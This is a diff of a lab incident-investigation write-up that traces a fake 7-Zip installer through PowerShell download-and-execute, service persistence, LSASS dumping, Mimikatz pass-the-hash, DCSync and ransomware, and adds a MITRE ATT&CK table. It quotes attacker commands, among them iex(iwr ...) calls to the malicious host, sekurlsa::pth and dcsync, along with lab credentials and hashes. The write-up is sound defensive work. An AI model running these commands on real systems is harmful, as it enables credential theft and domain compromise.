@@ -26,9 +26,7 @@ By filtering for Chrome-related events and examining records containing URL info
 
 The event revealed the following information:
 
-```text
-HostUrl=http://www.7zipp.org/a/7z2301-x64.msi
-```
+`HostUrl=http://www.7zipp.org/a/7z2301-x64.msi`
 
 <img width="1897" height="686" alt="Ekran görüntüsü 2026-06-15 194304" src="https://github.com/user-attachments/assets/d3d47ecb-c6d5-42cb-a6f1-ea64cd6100bc" />
 
@@ -97,9 +95,7 @@ I identified several PowerShell execution events containing external URLs.
 
 Among the results, one PowerShell command stood out because it downloaded and immediately executed a remote script hosted on the same malicious infrastructure identified during the previous phases.
 
-```text
-powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
-```
+`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`
 
 The command used `Invoke-WebRequest (iwr)` to retrieve the remote PowerShell script `7z.ps1` and `Invoke-Expression (iex)` to execute the downloaded content directly in memory.
 
@@ -125,9 +121,7 @@ I identified process creation events associated with the downloaded script.
 
 The process creation event revealed the full file path of the legitimate installer deployed by the script:
 
-```text
-C:\Windows\Temp\7zlegit.exe
-```
+`C:\Windows\Temp\7zlegit.exe`
 
 The command line indicated that the binary was executed silently using the `/S` switch, suggesting that the malware attempted to install a legitimate version of the software in order to reduce suspicion and maintain the appearance of a normal installation process.
 
@@ -154,15 +148,11 @@ I identified additional child processes launched by the malicious script.
 
 Among the observed activities, the script executed `sc.exe`, a legitimate Windows utility used to create and manage services. The command line revealed that a new service named `7zService` was created and configured to start automatically during system boot.
 
-```text
-"C:\Windows\system32\sc.exe" create 7zService binpath= "C:\Program Files\7-Zip\7zipp.exe" start=auto obj=LocalSystem
-```
+`"C:\Windows\system32\sc.exe" create 7zService binpath= "C:\Program Files\7-Zip\7zipp.exe" start=auto obj=LocalSystem`
 
 Shortly after creation, the service was started using the following command:
 
-```text
-"C:\Windows\system32\sc.exe" start 7zService
-```
+`"C:\Windows\system32\sc.exe" start 7zService`
 
 The service was configured to run under the `LocalSystem` account, granting it extensive privileges on the host. Additionally, the `start=auto` parameter ensured that the service would automatically execute whenever the system restarted, providing the attacker with a reliable persistence mechanism.
 
@@ -188,9 +178,7 @@ The results revealed multiple events linked to the implanted service, including 
 
 The associated events consistently identified the executing account as:
 
-```text
-SYSTEM
-```
+`SYSTEM`
 
 This behavior was consistent with the service configuration observed during the persistence phase, where the service was created to run under the `LocalSystem` account.
 
@@ -208,9 +196,7 @@ Credential dumping is a common post-compromise technique used by attackers to ob
 
 Using the following query:
 
-```text
-lsass
-```
+`lsass`
 
 I identified multiple PowerShell script block events containing code related to LSASS memory dumping and credential extraction.
 
@@ -220,26 +206,20 @@ I identified multiple PowerShell script block events containing code related to 
 
 Among the identified functions were:
 
-```text
-Invoke-NanoDump
-Invoke-PowerExtract
-```
+`Invoke-NanoDump
+Invoke-PowerExtract`
 
 The script content showed that `Invoke-NanoDump` was responsible for creating an LSASS memory dump, while `Invoke-PowerExtract` was designed to parse the resulting dump file and recover credential material from it.
 
 The most significant evidence was found directly within the script description:
 
-```text
-Invoke-PowerExtract parses and extracts information (e.g. NT-hashes) from memory dumps of the LSASS process
-```
+`Invoke-PowerExtract parses and extracts information (e.g. NT-hashes) from memory dumps of the LSASS process`
 
 This description explicitly identified the tool's purpose and confirmed that it was being used to extract credentials from the dumped LSASS memory.
 
 Based on the PowerShell script block logs, the tool used by the attacker to parse the LSASS dump and extract credentials was:
 
-```text
-Invoke-PowerExtract
-```
+`Invoke-PowerExtract`
 
 This finding confirmed that the attacker had successfully progressed to the Credential Access phase of the attack and was actively attempting to obtain account credentials for further privilege escalation and lateral movement.
 
@@ -256,9 +236,7 @@ Since NTLM hashes are commonly abused through Pass-the-Hash techniques, I search
 
 Using the following query:
 
-```text
-mimikatz
-```
+`mimikatz`
 
 I identified process creation events showing the download and execution of Mimikatz on the compromised workstation.
 
@@ -268,9 +246,7 @@ I identified process creation events showing the download and execution of Mimik
 
 To further investigate the functionality used by Mimikatz, I pivoted into the command-line arguments and searched for:
 
-```text
-process.command_line : *sekurlsa*
-```
+`process.command_line : *sekurlsa*`
 
 This query isolated Mimikatz credential-access activity and revealed the specific module used by the attacker.
 
@@ -280,21 +256,17 @@ This query isolated Mimikatz credential-access activity and revealed the specifi
 
 Reviewing the command-line parameters revealed the use of the following Mimikatz module:
 
-**sekurlsa::pth**
+`sekurlsa::pth`
 
 The `sekurlsa::pth` command is used to perform a Pass-the-Hash attack, allowing an attacker to authenticate as another user using an NTLM hash rather than the user's plaintext password.
 
 The command line exposed the compromised account and associated NTLM hash:
 
-```text
-james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF
-```
+`james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF`
 
 The complete command showed that the attacker launched a new PowerShell process using the recovered NTLM hash:
 
-```text
-.\mimikatz.exe "sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe"
-```
+`.\mimikatz.exe "sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe"`
 
 This finding confirmed that the attacker successfully leveraged harvested NTLM credentials to impersonate the account james.cromwell through a Pass-the-Hash attack.
 
@@ -308,9 +280,7 @@ Attackers frequently modify user accounts after obtaining elevated access in ord
 
 To investigate potential account management activity, I searched for executions of the Windows account administration utility:
 
-```text
-process.name : net.exe
-```
+`process.name : net.exe`
 
 The results revealed several account enumeration and management commands, including domain user and group-related activity.
 
@@ -320,17 +290,13 @@ The results revealed several account enumeration and management commands, includ
 
 Among the observed commands, one entry immediately stood out:
 
-```text
-"C:\Windows\system32\net.exe" users /domain anna.jones pwn3dpw!!!
-```
+`"C:\Windows\system32\net.exe" users /domain anna.jones pwn3dpw!!!`
 
 The command showed that the attacker reset the password of the domain account `anna.jones`.
 
 The new password assigned to the account was:
 
-```text
-pwn3dpw!!!
-```
+`pwn3dpw!!!`
 
 This finding confirmed that the attacker progressed beyond credential theft and actively manipulated domain user accounts after compromising `james.cromwell`.
 
@@ -344,9 +310,7 @@ Attackers commonly leverage compromised or newly modified accounts to expand acc
 
 Using the following query:
 
-```text
-powershell.connected_user.name : anna.jones
-```
+`powershell.connected_user.name : anna.jones`
 
 I identified multiple PowerShell events linked to the account.
 
@@ -354,9 +318,7 @@ I identified multiple PowerShell events linked to the account.
 
 > PowerShell events associated with `anna.jones` revealed the workstation where the account was actively used after the password reset.
 
-Reviewing the results showed activity associated with the following workstation:
-
-WKSTN-02
+Reviewing the results showed that the account was actively used on `WKSTN-02` after the password reset.
 
 The agent.hostname field identified WKSTN-02 as the workstation where PowerShell activity associated with the account anna.jones was observed.
 
@@ -374,9 +336,7 @@ To investigate this possibility, I searched for PowerShell credential objects as
 
 Using the following query:
 
-```text
-*PSCredential* AND user.name:*anna*
-```
+`*PSCredential* AND user.name:*anna*`
 
 I identified PowerShell activity involving the creation of a PSCredential object.
 
@@ -386,20 +346,13 @@ I identified PowerShell activity involving the creation of a PSCredential object
 
 Reviewing the command-line details exposed the following PowerShell statements:
 
-```text
-$username='SSF\itadmin';
+`$username='SSF\itadmin';
 $password='No06@39Sk0!';
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
 $new_creds = New-Object System.Management.Automation.PSCredential($username,$securePassword)
-```
+`
 
-The command created a PSCredential object using a newly discovered account and password, revealing the credential pair obtained by the attacker:
-
-```text
-Username: SSF\itadmin
-Password: No06@39Sk0!
-```
-
+The command created a PSCredential object using a newly discovered account and password. Analysis of the PowerShell statements revealed the credentials `SSF\itadmin` and `No06@39Sk0!`, exposing a newly discovered privileged account leveraged by the attacker.
 Further analysis showed that these credentials were subsequently used to perform domain administration activities through PowerShell. This indicated that the attacker had successfully expanded access beyond the previously compromised accounts and obtained a more privileged level of control within the environment.
 
 This finding confirmed that the attacker obtained and leveraged a new privileged account, providing additional opportunities for privilege escalation, account manipulation, and lateral movement within the environment.
@@ -417,9 +370,7 @@ To investigate potential credential access activity, I searched for PowerShell s
 
 Using the following query:
 
-```text
-*.ps1* AND user.name:*anna* AND *damian*
-```
+`*.ps1* AND user.name:*anna* AND *damian*`
 
 I identified PowerShell activity associated with a credential access operation targeting the domain administrator account.
 
@@ -429,21 +380,15 @@ I identified PowerShell activity associated with a credential access operation t
 
 Reviewing the command-line arguments exposed the following PowerShell script:
 
-```text
-Invoke-SharpKatz.ps1
-```
+`Invoke-SharpKatz.ps1`
 
 The command showed that the attacker downloaded and executed the script directly from a remote repository before launching a credential extraction operation:
 
-```text
-iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb)
-```
+`iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb)`
 
 Further analysis revealed that the script was used to perform a DCSync operation targeting the domain administrator account:
 
-```text
-Invoke-SharpKatz -Command "-Command dcsync --DomainController DC-01.swiftspendfinancial.thm --User damian.hall"
-```
+`Invoke-SharpKatz -Command "-Command dcsync --DomainController DC-01.swiftspendfinancial.thm --User damian.hall"`
 
 DCSync attacks allow an attacker to request password data directly from Active Directory by impersonating a Domain Controller. This technique is commonly used to obtain NTLM password hashes of privileged accounts without requiring interactive access to the target system.
 
@@ -461,20 +406,17 @@ To investigate the credential dumping output, I searched for references to the S
 
 Using the following query:
 
-```text
-*Invoke-SharpKatz.ps1* and *aes*
-```
+`*Invoke-SharpKatz.ps1* and *aes*`
 
 I identified PowerShell invocation logs containing credential information extracted from Active Directory.
 
 <img width="1893" height="678" alt="Ekran görüntüsü 2026-06-15 235702" src="https://github.com/user-attachments/assets/7231575f-fd83-4f23-82ac-2be31f5eb01a" />
 
 > DCSync output revealed multiple credential artifacts associated with the domain administrator account, including NTLM hashes and Kerberos AES encryption keys.
-Reviewing the output revealed the following AES256 hash:
 
-```text
-f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534
-```
+Reviewing the DCSync output revealed the AES256 Kerberos key associated with the domain administrator account:
+
+`f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534`
 
 The presence of Kerberos AES256 keys confirmed that the attacker successfully extracted credential data directly from Active Directory through the DCSync technique.
 
@@ -491,9 +433,8 @@ Ransomware operators commonly use privileged accounts to execute malware across 
 
 Using the following query:
 
-```text
-user.name : damian.hall and process.name : *.exe
-```
+`user.name : damian.hall and process.name : *.exe
+`
 
 <img width="1145" height="684" alt="Ekran görüntüsü 2026-06-16 000724" src="https://github.com/user-attachments/assets/8f5b2ab7-6ac6-4a4d-9e54-b419390efb88" />
 
@@ -504,9 +445,8 @@ Further investigation focused on file creation activity associated with the rans
 
 Using the following query:
 
-```text
-process.name : bomb.exe and event.code : 11
-```
+`process.name : bomb.exe and event.code : 11
+`
 
 I identified Sysmon File Create events generated by the ransomware.
 
@@ -514,42 +454,40 @@ I identified Sysmon File Create events generated by the ransomware.
 
 > File creation events associated with `bomb.exe` revealed the creation of encrypted files with a new ransomware-specific extension.
 
-Reviewing the results showed that the ransomware created files with the following extension:
-
-```text
-777zzz
-```
-
-Sysmon Event ID 11 recorded a total of:
-
-```text
-46
-```
-
+Reviewing the file creation events revealed that the ransomware encrypted files using the `.777zzz` extension. A total of `46` Sysmon Event ID 11 file creation events were recorded across the affected workstations.
 file creation events associated with the encrypted `.777zzz` files.
 
 This finding confirmed that the attacker successfully deployed ransomware after obtaining domain administrator privileges and encrypted a total of 46 files across the affected workstations.
 
 The investigation revealed a complete attack lifecycle, beginning with the initial phishing compromise and progressing through payload execution, persistence, credential dumping, Pass-the-Hash abuse, domain administrator compromise, and ultimately ransomware deployment. The successful encryption of files across multiple systems demonstrated the full operational impact of the intrusion.
 
+## MITRE ATT&CK Mapping
+
+| Tactic                             | Technique                                        | ID        | Evidence                                                                                                                      |
+| ---------------------------------- | ------------------------------------------------ | --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| Initial Access                     | Drive-by Compromise                              | T1189     | The victim downloaded a malicious MSI installer from the spoofed domain `7zipp.org` after clicking a sponsored search result. |
+| Execution                          | User Execution: Malicious File                   | T1204.002 | The victim executed the malicious file `7z2301-x64.msi` through `msiexec.exe`.                                                |
+| Execution                          | PowerShell                                       | T1059.001 | The MSI installer launched PowerShell and executed the remote script `7z.ps1`.                                                |
+| Persistence                        | Create or Modify System Process: Windows Service | T1543.003 | The attacker created and started the `7zService` Windows service using `sc.exe`.                                              |
+| Credential Access                  | OS Credential Dumping: LSASS Memory              | T1003.001 | `Invoke-NanoDump` and `Invoke-PowerExtract` were used to dump and parse LSASS memory.                                         |
+| Credential Access                  | DCSync                                           | T1003.006 | `Invoke-SharpKatz.ps1` performed a DCSync attack against the domain administrator account.                                    |
+| Defense Evasion / Lateral Movement | Pass the Hash                                    | T1550.002 | Mimikatz `sekurlsa::pth` was used with the NTLM hash of `james.cromwell`.                                                     |
+| Account Manipulation               | Account Manipulation                             | T1098     | The attacker reset the password of `anna.jones` using administrative access.                                                  |
+| Discovery                          | Account Discovery                                | T1087     | `net.exe` was used to enumerate and interact with domain accounts.                                                            |
+| Impact                             | Data Encrypted for Impact                        | T1486     | The ransomware binary `bomb.exe` encrypted files and created the `.777zzz` extension.                                         |
 
 
+## Conclusion
 
+This investigation successfully reconstructed the complete attack chain, beginning with a software supply chain compromise and ending with ransomware deployment across the environment.
 
+The attacker leveraged a malicious 7-Zip installer hosted on the spoofed domain `7zipp.org` to gain initial access to the victim workstation. Following execution of the MSI package, a PowerShell-based payload was downloaded and executed, ultimately leading to the installation of a persistent Windows service running with SYSTEM privileges.
 
+After establishing persistence, the attacker harvested credentials from LSASS memory using `Invoke-NanoDump` and `Invoke-PowerExtract`, then leveraged Mimikatz to perform a Pass-the-Hash attack against the account `james.cromwell`. The compromise continued through account manipulation, discovery of additional privileged credentials, and execution of a DCSync attack against the domain administrator account.
 
+With domain administrator privileges obtained, the attacker deployed the ransomware binary `bomb.exe`, resulting in the encryption of 46 files across affected workstations.
 
-
-
-
-
-
-
-
-
-
-
-
+This investigation highlighted how a seemingly legitimate software download can rapidly escalate into a full domain compromise when attackers successfully combine credential theft, privilege escalation, lateral movement, and ransomware deployment. The findings demonstrate the importance of monitoring PowerShell activity, service creation events, credential access techniques, and authentication anomalies to detect and contain similar attacks before they reach the impact stage.
 
 
 
